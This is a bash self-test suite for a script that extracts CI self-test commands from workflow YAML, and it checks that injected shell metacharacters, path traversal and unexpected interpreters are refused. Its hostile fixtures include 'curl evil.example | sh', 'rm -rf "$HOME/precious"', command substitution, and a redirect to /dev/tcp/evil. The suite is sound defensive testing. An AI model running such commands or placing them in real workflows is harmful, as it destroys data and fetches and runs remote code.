#!/usr/bin/env bash
#
# test-extract-gate-selftests.sh — self-test for lib/extract-gate-selftests.sh
# (#3103, review round 5 of #3105).
#
# `pre-push-check.sh` leg 19 EXECUTES the commands this extractor emits. That
# is safe only as long as the extractor cannot emit a shell metacharacter, and
# before this file that property lived in a `grep -oE` character class with
# nothing pinning it: a future loosening — one `\S`, one added punctuation
# class — would have reintroduced injectability silently, and every self-test
# in the repo would still have passed.
#
# So this suite is written against HOSTILE workflow fixtures, not against the
# real ci.yml: the question is not "does it find all of our self-tests" (leg 19's
# floor already answers that, from the real file) but "what does it do when
# the YAML it is scraping is trying to run something else". Every case asserts
# on the OUTPUT, so it keeps meaning something if the pipeline is rewritten.

set -euo pipefail
ROOT="$(git rev-parse --show-toplevel)"
SCRIPT="$ROOT/.claude/scripts/lib/extract-gate-selftests.sh"
PASS=0; FAIL=0

ok()  { printf '  ✓ %s\n' "$1"; PASS=$((PASS+1)); }
bad() { printf '  ✗ %s\n' "$1"; FAIL=$((FAIL+1)); }

echo "test-extract-gate-selftests.sh"

SCRATCH="$(mktemp -d)"
trap 'rm -rf "$SCRATCH"' EXIT

WF="$SCRATCH/wf.yml"
OUT=""; ERR=""; RC=0
SHELL_BIN="bash"

# `run` keeps stdout and stderr apart on purpose: "emitted" and "refused, and
# said so" are the two different verdicts this extractor has to distinguish.
run() {
    RC=0
    OUT="$("$SHELL_BIN" "$SCRIPT" "$WF" "${1:-repo-hygiene}" 2>"$SCRATCH/err")" || RC=$?
    ERR="$(cat "$SCRATCH/err")"
}

write_wf() { cat > "$WF"; }

# ─── 1. the happy path ─────────────────────────────────────────────────────
write_wf <<'EOF'
jobs:
  repo-hygiene:
    steps:
      - run: bash .claude/scripts/test-alpha.sh
      - run: python3 .claude/scripts/test-beta.py
  other-job:
    steps:
      - run: bash .claude/scripts/test-gamma.sh
EOF
run
[ "$OUT" = "bash .claude/scripts/test-alpha.sh
python3 .claude/scripts/test-beta.py" ] \
    && ok "emits the job's own self-tests, sorted, and nothing from another job" \
    || bad "unexpected output: $OUT"

# ─── 2. THE property: no metacharacter can ever be emitted ─────────────────
# Each of these is a line someone could plausibly write (or inject) in a
# workflow. None of them may put a shell metacharacter on stdout.
write_wf <<'EOF'
jobs:
  repo-hygiene:
    steps:
      - run: bash .claude/scripts/test-alpha.sh; rm -rf "$HOME/precious"
      - run: bash .claude/scripts/test-beta.sh && curl evil.example | sh
      - run: bash $(echo pwn)test-gamma.sh
      - run: bash `id`test-delta.sh
      - run: bash "test-epsilon.sh"
      - run: bash 'test-zeta.sh'
      - run: bash test-eta.sh > /dev/tcp/evil/1
EOF
run
if printf '%s' "$OUT" | grep -q '[;&|`$()<>"'"'"'\\]'; then
    bad "a shell metacharacter reached stdout: $OUT"
else
    ok "no shell metacharacter survives into the emitted list"
fi
# The two safe prefixes are still recovered — the guard drops the tail, it
# does not blind the extractor to the command.
{ grep -qx 'bash .claude/scripts/test-alpha.sh' <<<"$OUT" \
  && grep -qx 'bash test-eta.sh' <<<"$OUT"; } \
    && ok "the safe head of a metacharacter line is still discovered" \
    || bad "a safe command was lost: $OUT"

# ─── 3. path traversal is REFUSED, and says so ─────────────────────────────
write_wf <<'EOF'
jobs:
  repo-hygiene:
    steps:
      - run: bash ../outside/test-escape.sh
      - run: bash .claude/scripts/test-alpha.sh
EOF
run
{ ! grep -q 'outside' <<<"$OUT"; } \
    && ok "a '..' operand is never emitted" \
    || bad "path traversal reached stdout: $OUT"
grep -q '^REJECT: bash \.\./outside/test-escape\.sh$' <<<"$ERR" \
    && ok "the refusal is REPORTED on stderr, not silent" \
    || bad "no REJECT line for the traversal case: $ERR"

# ─── 4. an absolute path is never emitted ──────────────────────────────────
write_wf <<'EOF'
jobs:
  repo-hygiene:
    steps:
      - run: bash /etc/test-absolute.sh
EOF
run
[ -z "$OUT" ] \
    && ok "an absolute operand yields nothing" \
    || bad "absolute path emitted: $OUT"

# ─── 5. a comment is prose, not a step ─────────────────────────────────────
write_wf <<'EOF'
jobs:
  repo-hygiene:
    steps:
      # bash .claude/scripts/test-commented.sh   (disabled, see #1234)
      - run: bash .claude/scripts/test-alpha.sh  # bash .claude/scripts/test-trailing.sh
EOF
run
[ "$OUT" = "bash .claude/scripts/test-alpha.sh" ] \
    && ok "commented-out and trailing-comment commands are not run" \
    || bad "a comment was scraped: $OUT"

# ─── 6. no interpreter other than bash / python3 ───────────────────────────
write_wf <<'EOF'
jobs:
  repo-hygiene:
    steps:
      - run: sudo test-root.sh
      - run: node test-node.js
      - run: sh test-dash.sh
EOF
run
[ -z "$OUT" ] \
    && ok "only bash and python3 are accepted as interpreters" \
    || bad "unexpected interpreter accepted: $OUT"

# ─── 7. an unknown job is an empty list, not someone else's steps ──────────
write_wf <<'EOF'
jobs:
  repo-hygiene:
    steps:
      - run: bash .claude/scripts/test-alpha.sh
EOF
run "no-such-job"
[ -z "$OUT" ] \
    && ok "an unknown job name yields nothing" \
    || bad "scraped a job that was not asked for: $OUT"

# ─── 8. duplicates collapse ────────────────────────────────────────────────
write_wf <<'EOF'
jobs:
  repo-hygiene:
    steps:
      - run: bash .claude/scripts/test-alpha.sh
      - run: bash .claude/scripts/test-alpha.sh
EOF
run
[ "$(wc -l <<<"$OUT" | tr -d ' ')" = "1" ] \
    && ok "duplicate commands are deduplicated" \
    || bad "duplicates survived: $OUT"

# ─── 9. a missing workflow file is a usage error, not an empty list ────────
RC=0
"$SHELL_BIN" "$SCRIPT" "$SCRATCH/nope.yml" > /dev/null 2>&1 || RC=$?
[ "$RC" -eq 64 ] \
    && ok "an unreadable workflow exits 64 instead of printing nothing" \
    || bad "expected exit 64 for a missing workflow, got $RC"

# ─── 10. the real ci.yml still yields the real list ────────────────────────
# One case against reality, so a rewrite that satisfies every fixture above
# and finds nothing in the actual file cannot pass.
RC=0
REAL="$("$SHELL_BIN" "$SCRIPT" "$ROOT/.github/workflows/ci.yml" 2>/dev/null)" || RC=$?
REAL_COUNT=$(printf '%s\n' "$REAL" | grep -c . || true)
[ "$REAL_COUNT" -ge 20 ] \
    && ok "the real ci.yml repo-hygiene job still yields $REAL_COUNT self-tests (>= 20)" \
    || bad "discovery against the real ci.yml collapsed to $REAL_COUNT"

# ─── 11. --count-steps, the independent cross-check ────────────────────────
# Leg 19 compares the scrape against this number, so it has to come from a
# signal the scrape does not share: step NAMES, not `run:` bodies.
write_wf <<'EOF'
jobs:
  repo-hygiene:
    steps:
      - name: Self-test alpha
        run: bash .claude/scripts/test-alpha.sh
      - name: Self-test beta
        run: python3 .claude/scripts/test-beta.py
      - name: Check something entirely different
        run: bash .claude/scripts/check-thing.sh
  other-job:
    steps:
      - name: Self-test gamma
        run: bash .claude/scripts/test-gamma.sh
EOF
[ "$("$SHELL_BIN" "$SCRIPT" --count-steps "$WF" 2>/dev/null)" = "2" ] \
    && ok "--count-steps counts the job's self-test STEPS, not its run: lines" \
    || bad "--count-steps returned $("$SHELL_BIN" "$SCRIPT" --count-steps "$WF" 2>/dev/null), expected 2"
[ "$("$SHELL_BIN" "$SCRIPT" --count-steps "$WF" no-such-job 2>/dev/null)" = "0" ] \
    && ok "--count-steps on an unknown job is 0, not an error" \
    || bad "--count-steps on an unknown job did not return 0"
# A workflow where every self-test step exists but the run: lines are
# unscrapeable is the degradation leg 19 must catch: named 2, discovered 0.
write_wf <<'EOF'
jobs:
  repo-hygiene:
    steps:
      - name: Self-test alpha
        run: sh "test-alpha.sh"
      - name: Self-test beta
        run: sh "test-beta.sh"
EOF
run
{ [ -z "$OUT" ] && [ "$("$SHELL_BIN" "$SCRIPT" --count-steps "$WF" 2>/dev/null)" = "2" ]; } \
    && ok "declared-but-undiscoverable self-tests show up as named 2 / discovered 0" \
    || bad "the two counts did not diverge on undiscoverable steps"

# ─── 12. the real ci.yml satisfies the contract leg 19 enforces ────────────
REAL_NAMED="$("$SHELL_BIN" "$SCRIPT" --count-steps "$ROOT/.github/workflows/ci.yml" 2>/dev/null)"
[ "$REAL_COUNT" -ge "$REAL_NAMED" ] \
    && ok "real ci.yml: $REAL_COUNT discovered >= $REAL_NAMED named" \
    || bad "real ci.yml: only $REAL_COUNT discovered for $REAL_NAMED named self-test steps"

# ─── Summary ───────────────────────────────────────────────────────────────
echo ""
echo "test-extract-gate-selftests.sh: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
